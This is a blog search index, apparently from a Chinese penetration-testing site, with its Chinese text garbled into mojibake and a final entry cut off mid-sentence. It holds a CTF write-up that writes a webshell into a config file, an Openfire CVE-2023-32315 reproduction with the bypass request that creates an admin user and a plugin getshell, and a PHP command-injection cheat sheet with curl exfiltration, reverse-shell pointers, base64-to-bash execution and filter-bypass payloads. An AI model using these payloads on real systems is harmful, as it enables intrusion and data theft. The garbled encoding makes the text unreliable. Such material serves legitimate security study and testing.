<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/06/30/%E7%94%A8%E5%8F%8BNC%20uapjs%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CNVD-C-2023-76801)/"/>
      <url>/2023/06/30/%E7%94%A8%E5%8F%8BNC%20uapjs%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CNVD-C-2023-76801)/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/image-20230630150726862.png" alt="image-20230630150726862"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾¤å‹çš„é¢è¯•é¶åœº--ç®€å•ä»£ç å®¡è®¡</title>
      <link href="/2023/06/29/%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/06/29/%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èµ·å› æ˜¯æŸç¾¤å‹åœ¨ç¾¤é‡Œæ±‚åŠ©å…¶é¢è¯•éœ€è¦æ‰“çš„é¶åœºï¼Œæ­£å¥½å¥½ä¹…æ²¡æ‰“é¶åœºï¼Œå°±æ‰“æ‰“çœ‹ï¼Œå½“ç„¶æˆ‘ä¸ä¼šæŠŠè§£é¢˜è¿‡ç¨‹å‘Šè¯‰ä»–ï¼Œæ¯•ç«Ÿæ˜¯é¢è¯•ï¼Œæœ€å¤šç»™ä¸ªæç¤ºã€‚</p><h2 id="é¶åœº"><a href="#é¶åœº" class="headerlink" title="é¶åœº"></a>é¶åœº</h2><p>è®¿é—®</p><p><img src="/../images/image-20230629105330610.png" alt="image-20230629105330610"></p><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><ul><li>info.phpï¼šphpinfoä¿¡æ¯</li><li>download.phpï¼šfuzzå‡ºå‚æ•°ä¸ºfnï¼Œå­˜åœ¨è¿‡æ»¤ï¼Œæ— æ³•ç›®å½•ç©¿è¶Š</li><li><a href="http://www.zipï¼šæºç æ³„éœ²">www.zipï¼šæºç æ³„éœ²</a></li></ul><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼Œæ— æ¡†æ¶å‹çš„</p><p><img src="/../images/image-20230629010836352.png" alt="image-20230629010836352"></p><p>å…ˆçœ‹ä¸€ä¸‹index.phpæ–‡ä»¶</p><p><img src="/../images/image-20230629011023213.png" alt="image-20230629011023213"></p><p>è¿™ä¸ªåŒ…å«çš„åº”è¯¥å°±æ˜¯å‡½æ•°é›†æ–‡ä»¶ï¼Œé‡ç‚¹å…³æ³¨ï¼Œå…³é”®å‡½æ•°å¦‚ä¸‹</p><h4 id="adminè®¤è¯"><a href="#adminè®¤è¯" class="headerlink" title="adminè®¤è¯"></a>adminè®¤è¯</h4><p><img src="/../images/image-20230629011149349.png" alt="image-20230629011149349"></p><p>admin.phpå†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">1a1dc91c907325c69271ddf0c944bc72</span><br></pre></td></tr></table></figure><p>md5æŸ¥è¯¢å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">pass</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /phprusearch/index.php</span><br><span class="line"></span><br><span class="line">login=admin&amp;password=pass</span><br></pre></td></tr></table></figure><h3 id="ä»»æ„å†…å®¹å†™å…¥"><a href="#ä»»æ„å†…å®¹å†™å…¥" class="headerlink" title="ä»»æ„å†…å®¹å†™å…¥"></a>ä»»æ„å†…å®¹å†™å…¥</h3><p><img src="/../images/image-20230629110232773.png" alt="image-20230629110232773"></p><p>æ‰¾ä¸€ä¸‹è°ƒç”¨äº†è¯¥æ–¹æ³•çš„åœ°æ–¹</p><p>index.php</p><p><img src="/../images/image-20230629110310242.png" alt="image-20230629110310242"></p><p>ä¸è¡Œï¼Œå› ä¸º<code>$_SERVER[&quot;HTTP_REFERER&quot;]</code>ä¼šæŠŠ<code>&lt;?;</code>åˆ æ‰ï¼Œæ— æ³•å†™å…¥phpå†…å®¹</p><p>sadmin&#x2F;index.php</p><p><img src="/../images/image-20230629110516218.png" alt="image-20230629110516218"></p><p>æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥å°†postçš„å‚æ•°å†…å®¹å†™å…¥sconfig.phpä¸­</p><p>payload</p><p><img src="/../images/image-20230629011301625.png" alt="image-20230629011301625"></p><p>èšå‰‘è¿æ¥å³å¯</p><p><img src="/../images/image-20230629004608163.png" alt="image-20230629004608163"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Openfireèº«ä»½è®¤è¯ç»•è¿‡+æ’ä»¶Getshellæ¼æ´å¤ç°</title>
      <link href="/2023/06/25/openfire/"/>
      <url>/2023/06/25/openfire/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>â€‹Openfireçš„ç®¡ç†æ§åˆ¶å°æ˜¯ä¸€ä¸ªåŸºäº Web çš„åº”ç”¨ç¨‹åºï¼Œè¢«å‘ç°å¯ä»¥ä½¿ç”¨UTF-16å­—ç¬¦æ¥ç»•è¿‡è·¯å¾„ç©¿è¶Šçš„é˜²æŠ¤ï¼Œä»è€Œä»¥è·¯å¾„éå†çš„æ–¹å¼ç»•è¿‡æƒé™æ ¡éªŒã€‚æˆåŠŸåˆ©ç”¨åï¼Œæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯ä»¥è®¿é—® Openfire ç®¡ç†æ§åˆ¶å°ä¸­çš„åå°é¡µé¢ã€‚</p><p>â€‹åŒæ—¶ç”±äºOpenfireç®¡ç†æ§åˆ¶å°çš„åå°æä¾›äº†å®‰è£…æ’ä»¶çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡å®‰è£…æ¶æ„æ’ä»¶è¾¾æˆè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ•ˆæœ</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p> 3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8</p><p> 4.7.0 &lt;&#x3D; Openfire 4.7.x &lt; 4.7.5</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>vulhub</p></li><li><p>Fofaè¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;Openfire&quot;   49,485 æ¡åŒ¹é…ç»“æœ ( 23,657 æ¡ç‹¬ç«‹IP )</span><br></pre></td></tr></table></figure></li></ul><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="åˆ›å»ºç”¨æˆ·"><a href="#åˆ›å»ºç”¨æˆ·" class="headerlink" title="åˆ›å»ºç”¨æˆ·"></a>åˆ›å»ºç”¨æˆ·</h3><p>å·¥å…·</p><p><a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go run main.go -u http://openfire.com:9090</span><br><span class="line"></span><br><span class="line">go run main.go -l url.txt -t 20</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625225708359.png" alt="image-20230625225708359"></p><p>æ‰‹åŠ¨</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&amp;username=hackme&amp;name=&amp;email=&amp;password=hackme&amp;passwordConfirm=hackme&amp;isadmin=on&amp;create=Create+User</span><br></pre></td></tr></table></figure><p>åˆ›å»ºäº†ä¸€ä¸ªç”¨æˆ·åä¸å¯†ç å‡ä¸ºhackmeçš„ç”¨æˆ·</p><h3 id="æ’ä»¶getshell"><a href="#æ’ä»¶getshell" class="headerlink" title="æ’ä»¶getshell"></a>æ’ä»¶getshell</h3><p>ä½¿ç”¨å¢åŠ çš„ç”¨æˆ·è¿›å…¥åå°</p><p><img src="/../images/image-20230625224759596.png" alt="image-20230625224759596"></p><p>ä¸Šä¼ æ’ä»¶<a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar%EF%BC%8C%E6%9D%A5%E5%88%B0server">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jarï¼Œæ¥åˆ°server</a> settings</p><p><img src="/../images/image-20230625224848522.png" alt="image-20230625224848522"></p><p>è¾“å…¥å¯†ç å</p><p><img src="/../images/image-20230625224924825.png" alt="image-20230625224924825"></p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><p>æ‰‹åŠ¨</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625230442265.png" alt="image-20230625230442265"></p><p>nuclei</p><p><img src="/../images/image-20230625231354247.png" alt="image-20230625231354247"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§ç‰ˆæœ¬è‡³<strong>4.6.8æˆ–4.7.5åŠä»¥ä¸Š</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPå‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2023/06/25/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/06/25/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"><a href="#åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹" class="headerlink" title="åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"></a>åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹</h2><p>æ— å›æ˜¾æƒ…å†µ</p><ul><li><p>è·¯å¾„å¤§å°å†™æ•æ„Ÿ</p></li><li><p>é€šè¿‡<code>ping</code>å‘½ä»¤</p><blockquote><p>Windowsä¸‹çš„Pingå‘½ä»¤æ¯é—´éš”ä¸€ç§’ä¼šå‘é€ä¸€ä¸ªICMP ECHO_REQUEST åŒ…ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ Ping å‘½ä»¤æ¥è¿‘ä¼¼åœ°æ¨¡æ‹Ÿç­‰å¾…æŒ‡å®šç§’æ•°çš„æ•ˆæœ</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332-1687675268127.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146-1687675268129.png" alt="image-20230519171119146"></p></li></ul><h2 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h2><ul><li><p>åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠ¥é”™</span><br><span class="line">å»¶æ—¶</span><br></pre></td></tr></table></figure></li><li><p>åå¼¹shell</p><p>åœ¨çº¿ç”Ÿæˆï¼š<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>å¤–å¸¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>ä¸å‡ºç½‘+DNSè¯·æ±‚å‡ºç½‘</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>å°†æ–‡ä»¶ç§»åŠ¨åˆ°å¯è®¿é—®ç›®å½•ï¼ˆç½‘ç«™ç›®å½•ï¼Œé™æ€æ–‡ä»¶ç›®å½•ï¼‰</p><ul><li><p>è¯»å–å†…å®¹é‡å®šå‘å†™å…¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>å¤åˆ¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºé“¾æ¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="å†™ğŸ"><a href="#å†™ğŸ" class="headerlink" title="å†™ğŸ"></a>å†™ğŸ</h3><h4 id="ç¡®å®šç½‘ç«™è·¯å¾„"><a href="#ç¡®å®šç½‘ç«™è·¯å¾„" class="headerlink" title="ç¡®å®šç½‘ç«™è·¯å¾„"></a>ç¡®å®šç½‘ç«™è·¯å¾„</h4><ul><li><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /x /s /b yokan_test.js</span><br><span class="line">for /r c:\ %i in (yokan_test.js*) do @echo %i</span><br><span class="line">dir /s/a-d/b yokan_test.js</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -type f -name 1.js|while read f;do sh -c &#x27;id;pwd;hostname;/sbin/ifconfig&#x27; &gt;$(dirname $f)/test.txt;done</span><br><span class="line"></span><br><span class="line">locate /js/1.js|while read f;do sh -c &#x27;id;pwd;ifconfig&#x27;&gt;$(dirname $f)/test1.txt;done</span><br></pre></td></tr></table></figure></li></ul><h4 id="å‡ºç½‘"><a href="#å‡ºç½‘" class="headerlink" title="å‡ºç½‘"></a>å‡ºç½‘</h4><ul><li><p>è¿œç¨‹ä¸‹è½½</p><p><a href="https://paper.seebug.org/834/#windows">çº¢é˜Ÿåæ¸—é€æµ‹è¯•ä¸­çš„æ–‡ä»¶ä¼ è¾“æŠ€å·§</a></p></li><li><p>é‡å®šå‘å†™å…¥</p><blockquote><p><strong>webshellç‰¹æ®Šç¬¦å·é—®é¢˜ï¼Œå¯ä»¥å…ˆåšbase64ç¼–ç å†™å…¥ï¼Œç„¶åå†è§£ç </strong></p></blockquote></li></ul><h4 id="ä¸å‡ºç½‘"><a href="#ä¸å‡ºç½‘" class="headerlink" title="ä¸å‡ºç½‘"></a>ä¸å‡ºç½‘</h4><p>é‡å®šå‘å†™å…¥</p><h2 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"><a href="#å¤šæ¡å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"></a>å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h4><table><thead><tr><th align="center"></th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td></tr><tr><td align="center">ï¼›</td><td align="center">ä¾æ¬¡æ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">||</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">æ¢è¡Œæ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr><tr><td align="center">$()</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr></tbody></table><h4 id=""><a href="#" class="headerlink" title="."></a>.</h4><p>Linux ä¸­ï¼Œ<code>.</code>ä¹Ÿå«<code>period</code>ï¼Œå®ƒçš„ä½œç”¨å’Œ<code>source</code>ä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„ shell æ˜¯ bashï¼Œåˆ™ <code>. filename</code>çš„æ„æ€å°±æ˜¯ç”¨ bash æ‰§è¡Œ filename æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><ol><li><p>base64</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure></li><li><p>è¿›åˆ¶ç»•è¿‡</p><ul><li><p>shellè§£æå…«è¿›åˆ¶ï¼Œ<code>ls</code> â†’ <code>$&#39;\154&#39;$&#39;\163&#39;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpä¼ å‚æ—¶çš„æ ¼å¼</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">$(<span class="keyword">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>è¿›åˆ¶è½¬æ¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ul></li></ol><h4 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h4><ol><li><p>æ’å…¥\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>æ’å…¥ç©ºå­—ç¬¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9ä¸ºè„šæœ¬å‚æ•°</p><p>${xx}ä»£è¡¨å˜é‡å€¼,åªè¦xxæ²¡æœ‰å®šä¹‰å³å¯</p><p>å†…æ•›æ‰§è¡Œç©ºå‘½ä»¤</p></blockquote></li><li><p>å˜é‡æ‹¼æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>å…¶ä»–å‘½ä»¤ä»£æ›¿</p></li><li><p>æ–‡ä»¶åç”¨é€šé…ç¬¦</p></li></ol><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h4><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+ç©ºå­—ç¬¦</li><li>é‡å®šå‘ç¬¦</li><li><code>&#123;cat,flag.php&#125;</code></li><li>urlå‚æ•°ç¼–ç ï¼Œç©ºæ ¼%20ï¼Œåˆ¶è¡¨ç¬¦%09</li></ol><h4 id="ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡"><a href="#ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡" class="headerlink" title="ç›®å½•åˆ†éš”ç¬¦/ç»•è¿‡"></a>ç›®å½•åˆ†éš”ç¬¦<code>/</code>ç»•è¿‡</h4><ol><li><p>å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œå…ˆcdåˆ°ç›®çš„ç›®å½•ï¼Œå†æ‰§è¡Œcatç­‰å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>æˆªå–ç¯å¢ƒå˜é‡</p><p><code>env</code>æˆ–è€…<code>printenv</code>ï¼šæ‰“å°ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h4 id="é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡"><a href="#é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡"></a>é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;shell&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h4 id="å†…æ•›æ‰§è¡Œç»•è¿‡"><a href="#å†…æ•›æ‰§è¡Œç»•è¿‡" class="headerlink" title="å†…æ•›æ‰§è¡Œç»•è¿‡"></a>å†…æ•›æ‰§è¡Œç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><h4 id="é•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶ç»•è¿‡"></a>é•¿åº¦é™åˆ¶ç»•è¿‡</h4><h5 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h5><ol><li><p>lsè¾“å‡ºçš„ç»“æœæ˜¯æŒ‰ç…§å­—å…¸æ’åºçš„</p><p><img src="/../images/image-20221017101847464-1687675268129.png" alt="image-20221017101847464"></p></li><li><p>\æ”¾åœ¨æŒ‡ä»¤çš„æœ€æœ«ç«¯ï¼Œè¡¨ç¤ºæŒ‡ä»¤è¿æ¥ä¸‹ä¸€è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>å°†æ–‡ä»¶åï¼ˆå‘½ä»¤ï¼‰æŒ‰æ—¶é—´é‡å®šå‘åˆ°è„šæœ¬æ–‡ä»¶aä¸­ï¼Œ<code>sh a</code>æ‰§è¡Œè„šæœ¬aã€‚</p><p>æ³¨ï¼šå°†æ‰§è¡Œçš„å‘½ä»¤ååºç”Ÿæˆã€‚<code>\\</code>æ˜¯ä¸ºäº†è½¬ä¹‰ï¼Œè®©æ–‡ä»¶åå¸¦ä¸Š\</p><img src="E:\typora img\1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>å•ç‹¬ä¸€ä¸ª<code>*</code>ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä¸ºå‘½ä»¤ï¼Œå…¶ä»–ä¸ºè¯¥å‘½ä»¤çš„å‚æ•°</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317-1687675268129.png" alt="image-20221017102117317"></p><p>åœ¨è¿™ä¸ªåŸºç¡€ä¸Š<code>*o</code>ä¹Ÿå¯ä»¥ï¼Œå°±æ˜¯å–å‡ºæ»¡è¶³æ­£åˆ™*oçš„æ–‡ä»¶åæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/../images/image-20221017102322441-1687675268129.png" alt="image-20221017102322441"></p></li></ol><h4 id="æ— æ•°å­—ç»•è¿‡"><a href="#æ— æ•°å­—ç»•è¿‡" class="headerlink" title="æ— æ•°å­—ç»•è¿‡"></a>æ— æ•°å­—ç»•è¿‡</h4><p>å®‰æ´µæ¯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="comment"># åªèƒ½ç”¨$&#123;#&#125;\\(&lt;)\&#x27;0è¿™å‡ ä¸ªå­—ç¬¦æ„é€ å‘½ä»¤ã€‚</span></span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h5><p><a href="https://www.wolai.com/ctfhub/7oqQw5FrzCKj2us3ERp6Vg">https://www.wolai.com/ctfhub/7oqQw5FrzCKj2us3ERp6Vg</a>  </p><ol><li><p>è§£æå…«è¿›åˆ¶</p><blockquote><p>bash å¯ä»¥ç”¨ <code>$&#39;\ooo&#39;</code> çš„å½¢å¼ä¾†è¡¨é”ä»»æ„å­—å…ƒï¼ˆooo æ˜¯å­—å…ƒè½‰ ascii 